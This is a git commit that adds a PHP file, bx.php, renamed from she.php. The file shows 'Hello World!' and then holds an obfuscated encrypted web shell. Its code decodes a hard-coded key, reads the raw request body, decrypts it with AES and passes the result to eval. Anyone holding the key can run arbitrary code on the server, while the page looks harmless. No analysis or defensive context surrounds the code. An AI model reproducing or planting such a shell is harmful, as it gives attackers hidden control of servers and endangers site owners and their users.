8f2f8cd4b204941b6eae6a37829661672f782d21
arong11 <bingdong9087059209@gmail.com>
2024-06-20 12:32:59 +0800

    Update and rename she.php to bx.php

---
+++ bx.php
@@ -0,0 +1,45 @@
+Hello World!
+<?php
+@error_reporting(0);
+session_start();
+    $govLpsOhdiCNUSwcGW= base64_decode(base64_decode("TVRaaFkyRmpZekExWVdGbVlXWTI=")).chr(55);
+    $_SESSION['k']=$govLpsOhdiCNUSwcGW;
+    session_write_close();
+    $gov1Z5mxq3PIf9GoN=base64_decode(base64_decode("YjJKMWFHRnZjbkJtTlhWM05EUmtkbTl4"));
+    $govtFCCd='openssl';
+    $govtOTE4sV8thtN=govQtW($gov1Z5mxq3PIf9GoN);
+    $govMK3QDTczY="file_g".chr(101)."t_"."con".base64_decode("dGVudHM=");
+    $govcEdnhUF5Zznqkt5=$govMK3QDTczY($govtOTE4sV8thtN);
+    if(!extension_loaded($govtFCCd))
+    {
+        $govRpJPAtdL3KWg8="base64_"."decode";
+        $govcEdnhUF5Zznqkt5=$govRpJPAtdL3KWg8("/*X]-DP@i*/".$govcEdnhUF5Zznqkt5);
+        for($i=0;$i<strlen($govcEdnhUF5Zznqkt5);$i++) {
+                 
+            }
+    }
+    $govcEdnhUF5Zznqkt5=openssl_decrypt($govcEdnhUF5Zznqkt5, base64_decode(base64_decode("UVVWVE1UST0=")).chr(56), $govLpsOhdiCNUSwcGW);
+    $govzR3fsnoCVtfSRR=explode('|',$govcEdnhUF5Zznqkt5);
+    $govRrk=$govzR3fsnoCVtfSRR[1];
+    class govuSsrdx61{public function __invoke($p) {eval("/*X]-DP@i*/".$p."");}}
+    @call_user_func(new govuSsrdx61(),$govRrk);
+    function govQtW($govGu){
+    $di15 = '';
+    $gov9RFE = (10519+107)*intval(chr(48));
+    $gov8TmZ0rO3gqrNg1 = (4300-439)*intval(chr(48));
+    for ($i = 0, $j = strlen($govGu); $i < $j; $i++){
+        $gov9RFE <<= 5;
+        if ($govGu[$i] >= 'a' && $govGu[$i] <= 'z'){
+            $gov9RFE += (ord($govGu[$i]) - 97);
+        } elseif ($govGu[$i] >= '2' && $govGu[$i] <= '7') {
+            $gov9RFE += (24 + $govGu[$i]);
+        } else {
+            exit(1);
+        }
+        $gov8TmZ0rO3gqrNg1 += 5;
+        while ($gov8TmZ0rO3gqrNg1 >= 8){
+            $gov8TmZ0rO3gqrNg1 -= 8;
+            $di15 .= chr($gov9RFE >> $gov8TmZ0rO3gqrNg1);
+            $gov9RFE &= ((1 << $gov8TmZ0rO3gqrNg1) - 1);}}
+    return $di15;}
+?>
